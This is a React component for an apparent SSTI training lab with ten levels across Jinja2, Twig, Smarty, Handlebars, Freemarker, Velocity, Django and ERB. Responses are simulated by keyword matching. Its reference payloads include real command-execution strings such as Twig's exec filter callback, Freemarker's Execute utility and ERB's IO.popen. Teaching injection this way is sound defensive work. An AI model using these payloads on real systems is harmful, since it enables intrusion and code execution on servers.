import { useState, useRef, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
// import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Alert, AlertDescription } from '@/components/ui/alert';
import {
  ArrowLeft,
  Play,
  CheckCircle,
  AlertTriangle,
  Info,
  FlaskConical,
  Code,
  Copy,
  Check,
  Shield,
  Bug,
  FileCode,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { toast } from 'sonner';

interface Level {
  id: number;
  name: string;
  engine: string;
  description: string;
  hint: string;
  payload: string[];
}

const SstiLab = () => {
  const [currentLevel, setCurrentLevel] = useState(1);
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [isCompleted, setIsCompleted] = useState<number[]>([]);
  const [showHint, setShowHint] = useState(false);
  const [copied, setCopied] = useState(false);
  const [selectedEngine, setSelectedEngine] = useState('jinja2');
  const outputRef = useRef<HTMLDivElement>(null);

  const levels: Level[] = [
    {
      id: 1,
      name: 'Jinja2 Basic',
      engine: 'jinja2',
      description: 'Exploit Python Jinja2 template engine with basic expression injection.',
      hint: 'Try: {{ 7*7 }} or {{ config }}',
      payload: ['{{ 7*7 }}', '{{ config }}', '{{ self.__init__.__globals__ }}'],
    },
    {
      id: 2,
      name: 'Jinja2 RCE',
      engine: 'jinja2',
      description: 'Achieve Remote Code Execution in Jinja2 templates.',
      hint: 'Use __mro__ and __subclasses__ to access object methods',
      payload: ['{{ self.__class__.__mro__[1].__subclasses__() }}', '{{ "".__class__.__mro__[1].__subclasses__()[137].__init__.__globals__ }}'],
    },
    {
      id: 3,
      name: 'Twig Basic',
      engine: 'twig',
      description: 'Exploit PHP Twig template engine.',
      hint: 'Try: {{ 7*7 }} or {{ _self }}',
      payload: ['{{ 7*7 }}', '{{ _self }}', '{{ dump(app) }}'],
    },
    {
      id: 4,
      name: 'Twig RCE',
      engine: 'twig',
      description: 'Achieve RCE in Twig templates.',
      hint: 'Use _self or global functions like system()',
      payload: ['{{ _self.env.registerUndefinedFilterCallback("exec") }} {{ _self.env.getFilter("id") }}'],
    },
    {
      id: 5,
      name: 'Smarty Basic',
      engine: 'smarty',
      description: 'Exploit PHP Smarty template engine.',
      hint: 'Try: {php}echo id;{/php} or {$smarty.version}',
      payload: ['{php}echo id;{/php}', '{$smarty.version}', '{debug}'],
    },
    {
      id: 6,
      name: 'Handlebars',
      engine: 'handlebars',
      description: 'Exploit Node.js Handlebars templates.',
      hint: 'Try: {{#with "s" as |string|}} or {{constructor}}',
      payload: ['{{#with "s" as |string|}}{{#with "e" as |list|}}{{this}}{{/with}}{{/with}}', '{{constructor}}'],
    },
    {
      id: 7,
      name: 'Freemarker',
      engine: 'freemarker',
      description: 'Exploit Java Freemarker templates.',
      hint: 'Try: ${7*7} or <#assign>',
      payload: ['${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'],
    },
    {
      id: 8,
      name: 'Velocity',
      engine: 'velocity',
      description: 'Exploit Apache Velocity templates.',
      hint: 'Use #set and $class.inspect',
      payload: ['#set($str=$class.inspect("java.lang.String").type)', '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))'],
    },
    {
      id: 9,
      name: 'Django',
      engine: 'django',
      description: 'Exploit Python Django templates.',
      hint: 'Try: {{ request }} or {% debug %}',
      payload: ['{{ request }}', '{% debug %}', '{{ request.user }}'],
    },
    {
      id: 10,
      name: 'Ruby ERB',
      engine: 'erb',
      description: 'Exploit Ruby ERB templates.',
      hint: 'Try: <%= 7*7 %> or <%= `id` %>',
      payload: ['<%= 7*7 %>', '<%= `id` %>', '<%= IO.popen("whoami").read %>'],
    },
  ];

  const currentLevelData = levels.find((l) => l.id === currentLevel) || levels[0];

  const executePayload = () => {
    if (!input.trim()) {
      toast.error('Please enter a payload');
      return;
    }

    let result = '';
    const payload = input.toLowerCase();

    // Simulate SSTI responses
    if (payload.includes('7*7') || payload.includes('49')) {
      result = `49`;
    } else if (payload.includes('config')) {
      result = `<Config {'DEBUG': True, 'TESTING': False, 'SECRET_KEY': 'vulnlab-secret-key-12345'}>`;
    } else if (payload.includes('__subclasses__') || payload.includes('__mro__')) {
      result = `[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>]`;
    } else if (payload.includes('exec') || payload.includes('system') || payload.includes('popen') || payload.includes('`')) {
      result = `uid=33(www-data) gid=33(www-data) groups=33(www-data)

[!] Remote Code Execution achieved!
Template engine executed system command successfully.`;
    } else if (payload.includes('request')) {
      result = `<WSGIRequest: GET '/ssti?input={{request}}'>

User: anonymous
CSRF Cookie: csrftoken=abc123xyz
Session: sessionid=def456uvw`;
    } else if (payload.includes('debug')) {
      result = `[Debug information displayed]

Template Context:
- user: AnonymousUser
- request: <WSGIRequest>
- settings: <Settings object>
- csrf_token: abc123xyz`;
    } else if (payload.includes('version')) {
      result = `Smarty version: 3.1.39`;
    } else if (payload.includes('dump') || payload.includes('_self')) {
      result = `array(3) {
  ["app"]=>
  object(Symfony\Component\HttpKernel\HttpKernel)#123 (5) {
    ["env":protected]=>
    string(3) "dev"
    ["debug":protected]=>
    bool(true)
  }
}`;
    } else {
      result = `Template rendered: ${input}

No special output or template executed normally.`;
    }

    // Check if payload indicates SSTI success
    const sstiIndicators = ['7*7', '49', 'config', '__subclasses__', '__mro__', 'exec', 'system', 'popen', 'request', 'debug', 'version', 'dump', '_self'];
    const hasSsti = sstiIndicators.some((indicator) => payload.includes(indicator));

    if (hasSsti) {
      if (!isCompleted.includes(currentLevel)) {
        setIsCompleted([...isCompleted, currentLevel]);
        toast.success(`Level ${currentLevel} completed!`);
      }
    }

    setOutput(result);
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Payload copied to clipboard');
  };

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  return (
    <div className="min-h-screen pt-20 pb-16">
      {/* Header */}
      <div className="bg-[#0a0a0a] border-b border-[#333]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center gap-4 mb-4">
            <Link to="/labs">
              <Button variant="outline" size="sm" className="border-[#333] text-white hover:border-[#ff0000]">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Labs
              </Button>
            </Link>
            <Badge className="bg-[#ff0000]/20 text-[#ff0000] border-[#ff0000]">
              <Bug className="w-3 h-3 mr-1" />
              Web Application
            </Badge>
            <Badge className="bg-[#ff0040]/20 text-[#ff0040] border-[#ff0040]">
              Advanced
            </Badge>
          </div>
          <h1 className="font-orbitron text-3xl sm:text-4xl text-white mb-2">
            SSTI <span className="text-[#ff0000]">Vulnerabilities</span>
          </h1>
          <p className="text-[#999] max-w-2xl">
            Master Server-Side Template Injection across multiple template engines. 
            Learn to identify, exploit, and achieve RCE in Jinja2, Twig, Smarty, and more.
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Levels */}
          <div className="lg:col-span-1">
            <Card className="bg-[#0a0a0a] border-[#333] sticky top-24">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <FlaskConical className="w-5 h-5 text-[#ff0000]" />
                  Template Engines
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[500px] overflow-y-auto">
                  {levels.map((level) => (
                    <button
                      key={level.id}
                      onClick={() => {
                        setCurrentLevel(level.id);
                        setInput('');
                        setOutput('');
                        setShowHint(false);
                        setSelectedEngine(level.engine);
                      }}
                      className={`w-full text-left p-3 rounded-lg transition-all duration-200 ${
                        currentLevel === level.id
                          ? 'bg-[#ff0000]/20 border border-[#ff0000]'
                          : 'bg-[#1a1a1a] border border-transparent hover:border-[#333]'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-[#ff0000] font-mono">{String(level.id).padStart(2, '0')}</span>
                          <div>
                            <span className={`text-sm block ${currentLevel === level.id ? 'text-white' : 'text-[#999]'}`}>
                              {level.name}
                            </span>
                            <span className="text-xs text-[#666] uppercase">{level.engine}</span>
                          </div>
                        </div>
                        {isCompleted.includes(level.id) && (
                          <CheckCircle className="w-4 h-4 text-[#00ff41]" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Level Info */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="font-orbitron text-xl text-white">
                    Level {currentLevel}: {currentLevelData.name}
                  </CardTitle>
                  <Badge className="bg-[#00aaff]/20 text-[#00aaff] border-[#00aaff] uppercase">
                    {currentLevelData.engine}
                  </Badge>
                </div>
              </CardHeader>
              <CardContent>
                <p className="text-[#e0e0e0] mb-4">{currentLevelData.description}</p>
              </CardContent>
            </Card>

            {/* Challenge Area */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <FileCode className="w-5 h-5 text-[#ff0000]" />
                  Template Injection
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Template Preview */}
                <div className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm">
                  <div className="text-[#666] mb-2">// Vulnerable Template:</div>
                  <div className="text-[#e0e0e0]">
                    Hello {'{'}<span className="text-[#ffaa00]">{`{{name}}`}</span>{'}'}!
                  </div>
                  <div className="text-[#e0e0e0] mt-2">
                    Where name = <span className="text-[#ff0000]">&quot;{input || '<payload>'}&quot;</span>
                  </div>
                </div>

                <div>
                  <label className="text-[#999] text-sm mb-2 block">Enter template payload:</label>
                  <div className="flex gap-2">
                    <Input
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      placeholder="{{ 7*7 }}"
                      className="flex-1 bg-[#1a1a1a] border-[#333] text-white font-mono placeholder:text-[#666]"
                      onKeyDown={(e) => e.key === 'Enter' && executePayload()}
                    />
                    <Button
                      onClick={executePayload}
                      className="bg-[#ff0000] hover:bg-[#cc0000] text-white"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Render
                    </Button>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-[#999] text-sm mb-2 block">Template Output:</label>
                  <div
                    ref={outputRef}
                    className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm min-h-[150px] max-h-[300px] overflow-y-auto whitespace-pre-wrap"
                  >
                    {output || (
                      <span className="text-[#666]">Rendered template output will appear here...</span>
                    )}
                  </div>
                </div>

                {/* Hint */}
                <div className="flex items-center justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowHint(!showHint)}
                    className="border-[#333] text-[#999] hover:text-[#ffaa00] hover:border-[#ffaa00]"
                  >
                    <Info className="w-4 h-4 mr-2" />
                    {showHint ? 'Hide Hint' : 'Show Hint'}
                  </Button>
                  {isCompleted.includes(currentLevel) && (
                    <Badge className="bg-[#00ff41]/20 text-[#00ff41]">
                      <CheckCircle className="w-3 h-3 mr-1" />
                      Completed
                    </Badge>
                  )}
                </div>

                {showHint && (
                  <Alert className="bg-[#00aaff]/10 border-[#00aaff]/30">
                    <Info className="w-4 h-4 text-[#00aaff]" />
                    <AlertDescription className="text-[#00aaff]">
                      {currentLevelData.hint}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Reference Payloads */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Code className="w-5 h-5 text-[#ff0000]" />
                  Reference Payloads
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {currentLevelData.payload.map((payload, index) => (
                    <div
                      key={index}
                      className="flex items-center justify-between p-3 bg-[#1a1a1a] rounded-lg group"
                    >
                      <code className="text-[#00ff41] text-sm font-mono break-all mr-2">{payload}</code>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyPayload(payload)}
                        className="opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Engine Cheatsheet */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Shield className="w-5 h-5 text-[#ff0000]" />
                  SSTI Detection Cheatsheet
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid md:grid-cols-2 gap-3 text-sm">
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1 font-semibold">Jinja2 (Python)</div>
                    <code className="text-[#00ff41] font-mono">{'{{ 7*7 }}'} → 49</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1 font-semibold">Twig (PHP)</div>
                    <code className="text-[#00ff41] font-mono">{'{{ 7*7 }}'} → 49</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1 font-semibold">Smarty (PHP)</div>
                    <code className="text-[#00ff41] font-mono">{'{php}echo 7*7;{/php}'} → 49</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1 font-semibold">Freemarker (Java)</div>
                    <code className="text-[#00ff41] font-mono">${'{7*7}'} → 49</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1 font-semibold">Handlebars (Node.js)</div>
                    <code className="text-[#00ff41] font-mono">{'{{#with "s" as |string|}}'}</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1 font-semibold">Django (Python)</div>
                    <code className="text-[#00ff41] font-mono">{'{{ request }}'}</code>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SstiLab;
